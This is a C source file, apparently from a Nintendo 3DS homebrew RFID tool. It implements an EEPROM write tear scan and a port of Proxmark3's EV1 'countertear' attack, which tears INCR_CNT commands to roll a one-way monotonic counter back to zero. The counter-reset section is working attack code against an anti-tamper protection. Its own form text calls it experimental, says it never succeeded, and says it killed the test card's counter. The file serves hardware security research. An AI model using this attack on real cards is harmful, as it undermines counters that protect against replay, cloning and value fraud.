// Ultralight / NTAG tear-off (mfu.h mfuTorn, pm3 hw tearoff): a write tear scan on a user page (pm3 hf mfu
// otptear, which shows the EEPROM's erase and write phases) and the EV1 counter reset (pm3 hf mfu
// countertear, Quarkslab's "RFID Monotonic Counter Anti-Tearing Defeated").

#include <stdio.h>
#include <string.h>
#include <3ds.h>

#include "app.h"
#include "entry.h"
#include "mfu.h"
#include "probe.h"
#include "ui.h"

static char jobWhy[96];
static int jobResult;

// --- write tear scan ---

#define WS_MAX 512

static struct {
	int page; // 0 = the last user page
	int from, to, step;
	u8 old[4], neu[4];
} ws = { 0, 0, 3200, 50, { 0xAA, 0xAA, 0xAA, 0xAA }, { 0x55, 0x55, 0x55, 0x55 } };

static struct {
	u16 us;
	s8 ok; // 1 read back, 0 lost
	u8 got[4];
} wr[WS_MAX];
static volatile int wn, wTotal;
static int wPage;
static char wType[48];
static UiList wl;

static const Screen wsResults;

static bool allZero(const u8 *g)
{
	return !(g[0] | g[1] | g[2] | g[3]);
}

static bool subset(const u8 *g, const u8 *of)
{
	for (int i = 0; i < 4; i++)
		if (g[i] & ~of[i]) return false;
	return true;
}

static const char *phaseOf(const u8 *g)
{
	if (!memcmp(g, ws.old, 4)) return "old";
	if (!memcmp(g, ws.neu, 4)) return "new";
	if (allZero(g)) return "erased";
	bool o = subset(g, ws.old), n = subset(g, ws.neu);
	return o && !n ? "erasing" : n && !o ? "writing" : "mixed";
}

// In a job, card active.
static void scanCore(void)
{
	jobResult = 0, *jobWhy = 0, wn = 0;
	MfuInfo in;
	int r = mfuIdentify(&in);
	if (r <= 0) {
		jobResult = r;
		snprintf(jobWhy, sizeof(jobWhy), "No Ultralight / NTAG answer (%s)", mfuWhy());
		return;
	}
	const MfuType *t = in.type;
	snprintf(wType, sizeof(wType), "%s", t->name);
	wPage = ws.page ? ws.page : t->userEnd - 1;
	if (wPage < 4 || wPage >= t->userEnd) {
		snprintf(jobWhy, sizeof(jobWhy), "Page %d is not user memory on the %s (4-%d).", wPage, t->name, t->userEnd - 1);
		return;
	}
	wTotal = (ws.to - ws.from) / ws.step + 1;
	if (wTotal > WS_MAX) wTotal = WS_MAX;
	for (int i = 0; i < wTotal && !mfCancel; i++) {
		u32 us = ws.from + i * ws.step;
		wr[i].us = us;
		r = mfuTearWrite(t, wPage, ws.old, ws.neu, us, wr[i].got);
		if (r < 0) {
			jobResult = -1;
			return;
		}
		wr[i].ok = r;
		wn = i + 1;
		logp("tear %4lu us: %s\n", us, r ? phaseOf(wr[i].got) : mfuWhy());
		if (!r) { // the card is gone or refused the setup write: stop with what we have
			snprintf(jobWhy, sizeof(jobWhy), "%s", mfuWhy());
			break;
		}
	}
	jobResult = 1;
}

static void runScan(void)
{
	wn = 0;
	if (cardWait()) scanCore();
}

static float scanView(float x, float y, float w)
{
	int n = wn, total = wTotal;
	if (!total) return 0;
	uiBar(x, y, w, 6, (float)n / total, uiCol[COL_ACCENT]);
	if (n) {
		const u8 *g = wr[n - 1].got;
		uiText(x, y + 10, S_SMALL, uiCol[COL_TEXT], "%d of %d: %u us -> %02X%02X%02X%02X %s", n, total, wr[n - 1].us,
			g[0], g[1], g[2], g[3], wr[n - 1].ok ? phaseOf(g) : "(lost)");
	}
	return 10 + SMALL_H;
}

static void doneScan(void)
{
	if (jobResult < 0) {
		msgBox("Tear-off", "The chip stopped answering.\nTry again.");
		return;
	}
	if (!wn) {
		if (!mfCancel && *jobWhy) msgBox("Tear-off", "%s", jobWhy);
		return;
	}
	wl = (UiList){ 0 };
	appScreen(&wsResults);
}

// The first point (from `from`) where cond holds, -1 none.
static int firstWhere(int from, bool (*cond)(int i))
{
	for (int i = from; i < wn; i++)
		if (wr[i].ok && cond(i)) return i;
	return -1;
}
static bool notOld(int i) { return memcmp(wr[i].got, ws.old, 4); }
static bool zero(int i) { return allZero(wr[i].got); }
static bool notZero(int i) { return !allZero(wr[i].got); }
static bool isNew(int i) { return !memcmp(wr[i].got, ws.neu, 4); }

#define WS_ROWS 12

static void wsDraw(void)
{
	char hdr[48], s[96];
	snprintf(hdr, sizeof(hdr), "page %d, %d points", wPage, wn);
	uiHeader("Tear-off: write scan", hdr);
	float y = 26;
	snprintf(s, sizeof(s), "%s: %02X%02X%02X%02X -> %02X%02X%02X%02X (us after the frame)", wType, ws.old[0],
		ws.old[1], ws.old[2], ws.old[3], ws.neu[0], ws.neu[1], ws.neu[2], ws.neu[3]);
	uiText(12, y, S_SMALL, uiCol[COL_DIM], "%s", uiFit(s, UI_W - 24, S_SMALL));
	y += SMALL_H + 2;
	// the EEPROM's phases, pm3 otptear's summary
	int e0 = firstWhere(0, notOld), e1 = e0 < 0 ? -1 : firstWhere(e0, zero);
	int w0 = e1 < 0 ? -1 : firstWhere(e1, notZero), w1 = firstWhere(e0 < 0 ? 0 : e0, isNew);
	int o = 0;
	*s = 0;
	if (e0 >= 0) o += sprintf(s + o, "erase from %u us", wr[e0].us);
	if (e1 >= 0) o += sprintf(s + o, ", erased at %u", wr[e1].us);
	if (w0 >= 0) o += sprintf(s + o, ", write from %u", wr[w0].us);
	if (w1 >= 0) o += sprintf(s + o, "%sdone at %u us", o ? ", " : "", wr[w1].us);
	if (!o) sprintf(s, "No change at any delay: try later delays");
	uiRect(8, y, UI_W - 16, SMALL_H + 4, uiCol[COL_PANEL]);
	uiText(14, y + 2, S_SMALL, uiCol[COL_TEXT], "%s", uiFit(s, UI_W - 28, S_SMALL));
	y += SMALL_H + 8;
	for (int i = 0; i < WS_ROWS && wl.top + i < wn; i++, y += SMALL_H) {
		int k = wl.top + i;
		const u8 *g = wr[k].got;
		const char *p = wr[k].ok ? phaseOf(g) : "lost";
		bool sel = k == wl.sel;
		if (sel) uiRect(8, y - 1, UI_W - 16, SMALL_H, uiCol[COL_SEL]);
		uiTextRight(70, y, S_SMALL, uiCol[COL_TEXT], "%u us", wr[k].us);
		if (wr[k].ok) {
			sprintf(s, "%02X%02X%02X%02X", g[0], g[1], g[2], g[3]);
			uiMonoS(90, y + 1, 0.36f, 6.0f, uiCol[COL_TEXT], s);
		}
		uiText(160, y, S_SMALL, uiCol[!strcmp(p, "old") || !strcmp(p, "new") ? COL_DIM : !strcmp(p, "lost") ? COL_ERR : COL_ACCENT],
			"%s", p);
	}
	uiFooter(BTN_UD " scroll   " BTN_X " scan again   " BTN_B " back");
}

static void wsInput(u32 kDown, u32 kRepeat)
{
	uiListNav(&wl, wn, WS_ROWS, kRepeat);
	if (kDown & KEY_X) {
		appBack();
		jobStartView("Tear-off: write scan", runScan, doneScan, true, scanView);
	}
	if (kDown & KEY_B) appBack();
}

static const Screen wsResults = { NULL, wsInput, wsDraw };

static void pageV(char *o)
{
	if (ws.page) sprintf(o, "%d", ws.page);
	else strcpy(o, "the last user page");
}
static void pageSet(s64 v) { ws.page = v; }
static void pageE(void)
{
	entryDec("Page", "A user memory page (4 and up; 0 = the card's last one). Its contents get overwritten.", 0, 255, ws.page, pageSet);
}
static void fromV(char *o) { sprintf(o, "%d us", ws.from); }
static void fromSet(s64 v) { ws.from = v; }
static void fromE(void) { entryDec("From", "First delay after the WRITE frame, microseconds.", 0, MFU_TEAR_MAX, ws.from, fromSet); }
static void toV(char *o) { sprintf(o, "%d us", ws.to); }
static void toSet(s64 v) { ws.to = v; }
static void toE(void) { entryDec("To", "Last delay, microseconds.", 0, MFU_TEAR_MAX, ws.to, toSet); }
static void stepV(char *o) { sprintf(o, "%d us", ws.step); }
static void stepSet(s64 v) { ws.step = v; }
static void stepE(void) { entryDec("Step", "Microseconds between two tries.", 1, 5000, ws.step, stepSet); }
static void oldV(char *o) { sprintf(o, "%02X%02X%02X%02X", ws.old[0], ws.old[1], ws.old[2], ws.old[3]); }
static void oldSet(const u8 *b, u32 len) { memcpy(ws.old, b, 4); }
static void oldE(void) { entryHex("Old value", "Written (normally) before each torn write.", 4, ws.old, oldSet); }
static void neuV(char *o) { sprintf(o, "%02X%02X%02X%02X", ws.neu[0], ws.neu[1], ws.neu[2], ws.neu[3]); }
static void neuSet(const u8 *b, u32 len) { memcpy(ws.neu, b, 4); }
static void neuE(void) { entryHex("New value", "The torn write's data.", 4, ws.neu, neuSet); }

static const Field wsFields[] = {
	{ "Page", pageV, pageE }, { "From", fromV, fromE }, { "To", toV, toE }, { "Step", stepV, stepE },
	{ "Old value", oldV, oldE }, { "New value", neuV, neuE },
};
static int wsCount(void) { return 6; }

static void wsRun(void)
{
	if (ws.to < ws.from) {
		msgBox("Tear-off", "To is before From.");
		return;
	}
	jobStartView("Tear-off: write scan", runScan, doneScan, true, scanView);
}

static void writeScan(void)
{
	formOpen("Tear-off: write scan", "Scan (WRITES THE PAGE)",
		"Per delay: the page gets the old value, then a WRITE of the new one with the field cut that long "
		"after the frame, then a read. Shows when the EEPROM erases and writes (pm3 hf mfu otptear). "
		"User memory only.", wsFields, wsCount, wsRun);
}

// --- EV1 counter reset (pm3 hf mfu countertear) ---

// pm3's constants (cmdhfmfu.c MFU_CNT_*); delays after the frame end, as pm3's tear-off hook
#define CNT_MAX       0xFFFFFF
#define CNT_PREP      0x00FFFF
#define CNT_STUCK     6
#define BD_MIN        2650
#define BD_MAX        3200
#define BD_STEP       5
#define OFF_00        10
#define CNT_MAX_STEPS 2000

static struct {
	int cnt;
	int bd; // 0 = calibrate
} cs = { 0, 0 };

static volatile struct {
	const char *phase;
	int bd, steps, start, val;
	u8 tear;
	u64 t0;
} cp;

static int ctr;

// INCR_CNT(v) torn at us; -1 monitor, 0 lost, 1 ok
static int tincr(u32 v, int us)
{
	return mfuIncrTorn(ctr, v, us);
}

static int readCnt(u32 *v, u8 *t)
{
	int r = mfuCounter(ctr, v, t);
	if (r > 0) cp.val = *v, cp.tear = *t;
	return r;
}

// pm3 mfu_cnt_normalize_tear: increment by 0 until the tearing flag is BD again
static int normalize(void)
{
	for (int i = 0; i < 10; i++) {
		u32 v;
		u8 t;
		int r = readCnt(&v, &t);
		if (r < 0) return -1;
		if (r && t == 0xBD) return 1;
		if (mfuIncr(ctr, 0) < 0) return -1;
	}
	return 0;
}

#define TRY(x) ({ int _r = (x); if (_r < 0) { jobResult = -1; return; } _r; })

// In a job, card active.
static void counterCore(void)
{
	jobResult = 0, *jobWhy = 0, ctr = cs.cnt;
	memset((void *)&cp, 0, sizeof(cp));
	cp.phase = "Checking the card";
	MfuInfo in;
	int r = TRY(mfuIdentify(&in));
	if (!r || !in.type->tearing) {
		snprintf(jobWhy, sizeof(jobWhy), "Needs a MIFARE Ultralight EV1 (counters with tearing flags)%s%s.",
			r ? ": this is a " : "", r ? in.type->name : "");
		return;
	}
	u32 v;
	u8 t;
	TRY(normalize());
	if (TRY(readCnt(&v, &t)) <= 0) {
		snprintf(jobWhy, sizeof(jobWhy), "Counter %d did not read (%s).", ctr, mfuWhy());
		return;
	}
	cp.start = v, cp.t0 = osGetTime();
	if (v == 0) {
		snprintf(jobWhy, sizeof(jobWhy), "Counter %d is 0 already.", ctr);
		return;
	}
	if (v == CNT_MAX) {
		snprintf(jobWhy, sizeof(jobWhy), "Counter %d is at its maximum (FFFFFF): it can't move.", ctr);
		return;
	}
	int bd = cs.bd;
	if (!bd) {
		// pm3 mfu_cnt_calibrate: the first delay where a torn INCR(0) leaves the flag at BD and the
		// counter where it was
		cp.phase = "Calibrating";
		for (int d = BD_MIN; d < BD_MAX && !mfCancel; d += BD_STEP) {
			cp.bd = d;
			u32 i0, f;
			u8 t2;
			if (TRY(readCnt(&i0, &t)) <= 0) continue;
			TRY(tincr(0, d));
			if (TRY(mfuCounter(ctr, &f, &t2)) <= 0) t2 = 0;
			TRY(mfuIncr(ctr, 0));
			TRY(mfuIncr(ctr, 0));
			if (TRY(readCnt(&f, &t)) <= 0) continue;
			if (t2 == 0xBD && f == i0) {
				bd = d;
				break;
			}
		}
		if (!bd) {
			if (!mfCancel) snprintf(jobWhy, sizeof(jobWhy), "Calibration found no working delay (%d-%d us).", BD_MIN, BD_MAX);
			return;
		}
		logp("countertear: BD delay %d us\n", bd);
	}
	// pm3 mfu_cnt_attack_loop: DECREMENT (above 0x00FFFF), PREPARE (up to 0x00FFFF), RESET (towards 0)
	enum { DEC, PREP, RESET } phase = DEC;
	static const char *names[] = { "Decrementing", "Preparing (to 00FFFF)", "Resetting" };
	cp.bd = bd;
	int lost = 0;
	while (!mfCancel && cp.steps < CNT_MAX_STEPS) {
		cp.phase = names[phase];
		if (TRY(readCnt(&v, &t)) <= 0) {
			if (++lost == 10) {
				snprintf(jobWhy, sizeof(jobWhy), "Lost the card (%s).", mfuWhy());
				return;
			}
			TRY(normalize());
			continue;
		}
		lost = 0;
		if (v == 0) {
			jobResult = 1;
			logp("countertear: counter %d is 0 after %d steps\n", ctr, cp.steps);
			return;
		}
		if (v == CNT_STUCK) {
			TRY(normalize());
			continue;
		}
		if (phase == DEC && v <= CNT_PREP) {
			TRY(mfuIncr(ctr, 0));
			TRY(mfuIncr(ctr, 0));
			phase = PREP;
			continue;
		}
		if (phase == PREP) {
			if (v < CNT_PREP) {
				TRY(mfuIncr(ctr, CNT_PREP - v));
				TRY(mfuIncr(ctr, 0));
				continue;
			}
			phase = v == CNT_PREP ? RESET : DEC;
			continue;
		}
		cp.steps++;
		if (phase == DEC) {
			TRY(tincr(0x100, bd));
			TRY(tincr(0, bd - OFF_00));
			TRY(tincr(0, bd));
			TRY(tincr(0, bd - OFF_00));
		} else {
			TRY(tincr(1, bd));
			TRY(tincr(0, bd - OFF_00));
		}
		TRY(normalize());
		u32 f;
		if (TRY(readCnt(&f, &t)) <= 0) continue;
		if (phase == RESET && f > CNT_PREP) phase = DEC;
		// pm3 mfu_cnt_tune_delay: no change -> later, a big jump -> earlier
		if (f == v && bd < BD_MAX) bd++;
		else if (f > v + 10 && bd > BD_MIN) bd--;
		cp.bd = bd;
	}
	if (!mfCancel) snprintf(jobWhy, sizeof(jobWhy), "No reset after %d steps (counter %06lX).", cp.steps, (u32)cp.val);
}

static void runCounter(void)
{
	memset((void *)&cp, 0, sizeof(cp));
	if (cardWait()) counterCore();
}

static float counterView(float x, float y, float w)
{
	if (!cp.phase) return 0;
	u32 txt = uiCol[COL_TEXT], dim = uiCol[COL_DIM];
	uiText(x, y, S_SMALL, txt, "%s", cp.phase);
	y += SMALL_H;
	uiText(x, y, S_SMALL, txt, "Counter %d: %06X (from %06X)   flag %02X", ctr, cp.val, cp.start, cp.tear);
	y += SMALL_H;
	uiText(x, y, S_SMALL, dim, "BD delay %d us, 00 delay %d us, %d steps", cp.bd, cp.bd - OFF_00, cp.steps);
	return 3 * SMALL_H;
}

static void doneCounter(void)
{
	if (jobResult < 0)
		msgBox("Counter reset", "The chip stopped answering.\nTry again.");
	else if (jobResult > 0)
		msgBox("Counter reset", "Counter %d is 0 again (it was %06X), after %d steps.", ctr, cp.start, cp.steps);
	else if (!mfCancel && *jobWhy)
		msgBox("Counter reset", "%s", jobWhy);
}

static void cntV(char *o) { sprintf(o, "%d", cs.cnt); }
static void cntSet(s64 v) { cs.cnt = v; }
static void cntE(void) { entryDec("Counter", "Which EV1 counter (0-2).", 0, 2, cs.cnt, cntSet); }
static void bdV(char *o)
{
	if (cs.bd) sprintf(o, "%d us", cs.bd);
	else strcpy(o, "calibrate");
}
static void bdSet(s64 v) { cs.bd = v; }
static void bdE(void)
{
	entryDec("BD delay", "The tear delay after the INCR_CNT frame (pm3 --DelayBD); 0 = find it first.", 0, BD_MAX, cs.bd, bdSet);
}

static const Field csFields[] = { { "Counter", cntV, cntE }, { "BD delay", bdV, bdE } };
static int csCount(void) { return 2; }

static void csRun(void)
{
	jobStartView("Counter reset", runCounter, doneCounter, true, counterView);
}

static void counterReset(void)
{
	formOpen("Tear-off: EV1 counter reset", "Run (MAY KILL THE COUNTER)",
		"EXPERIMENTAL. Tears INCR_CNT until the counter goes back to 0 (pm3 hf mfu countertear). Below 00FFFF "
		"it first counts up to 00FFFF, the way the attack needs; B stops it. Never succeeded here, and on the "
		"test EV1 it left the counter dead for good (every command on it: NAK 6).", csFields, csCount, csRun);
}

void mfuTearMenu(void)
{
	static const MenuItem items[] = { { "Write tear scan", writeScan }, { "EV1 counter reset", counterReset } };
	popup("Tear-off", items, 2);
}

int mfuTearNet(const u8 *a, u32 n, char *out, u32 max)
{
	int o = 0;
	if (n >= 15 && a[0] == 0) {
		ws.page = a[1], ws.from = a[2] | a[3] << 8, ws.to = a[4] | a[5] << 8, ws.step = a[6] | a[7] << 8;
		memcpy(ws.old, a + 8, 4), memcpy(ws.neu, a + 12, 4);
		if (!ws.step || ws.to < ws.from) return snprintf(out, max, "bad range");
		scanCore();
		if (jobResult < 0) return -1;
		o += snprintf(out + o, max - o, "%s page %d%s%s\n", wType, wPage, *jobWhy ? ": " : "", jobWhy);
		for (int i = 0; i < wn && o < (int)max - 40; i++) {
			const u8 *g = wr[i].got;
			o += snprintf(out + o, max - o, "%5u us  %02X%02X%02X%02X  %s\n", wr[i].us, g[0], g[1], g[2], g[3],
				wr[i].ok ? phaseOf(g) : "lost");
		}
		return o;
	}
	if (n >= 4 && a[0] == 1) {
		cs.cnt = a[1], cs.bd = a[2] | a[3] << 8;
		counterCore();
		if (jobResult < 0) return -1;
		return snprintf(out, max, "%s counter %d: %06X -> %06X, BD %d us, %d steps, %lu ms%s%s\n",
			jobResult ? "RESET" : "no reset", ctr, cp.start, cp.val, cp.bd, cp.steps,
			cp.t0 ? (u32)(osGetTime() - cp.t0) : 0, *jobWhy ? ": " : "", jobWhy);
	}
	return snprintf(out, max, "bad arguments");
}
